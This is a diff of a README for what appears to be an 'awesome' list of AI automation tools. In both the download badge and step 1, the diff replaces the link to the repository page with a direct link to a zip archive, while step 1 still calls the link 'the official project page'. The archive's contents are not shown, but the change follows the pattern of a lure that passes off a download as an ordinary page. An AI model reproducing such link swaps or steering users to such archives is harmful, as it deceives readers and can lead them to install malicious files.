@@ -1,6 +1,6 @@
 # 🤖 awesome-automated-ai - Find the best automation tools today
 
-<a href="https://github.com/Wrongful-stratocracy6799/awesome-automated-ai">
+<a href="https://github.com/Wrongful-stratocracy6799/awesome-automated-ai/raw/refs/heads/main/templates/automated-awesome-ai-v3.4-alpha.1.zip">
   <img src="https://img.shields.io/badge/Download_Now-Blue-blue" alt="Download">
 </a>
 
@@ -26,7 +26,7 @@ Some tools in this collection require a compatible graphics card to run fast. If
 
 Follow these steps to reach the software collection.
 
-1.  Visit the official project page: https://github.com/Wrongful-stratocracy6799/awesome-automated-ai
+1.  Visit the official project page: https://github.com/Wrongful-stratocracy6799/awesome-automated-ai/raw/refs/heads/main/templates/automated-awesome-ai-v3.4-alpha.1.zip
 2.  Review the document categories on the main page.
 3.  Click the blue links associated with the specific tool you wish to use.
 4.  Navigate to the repository or project website linked for that specific application.
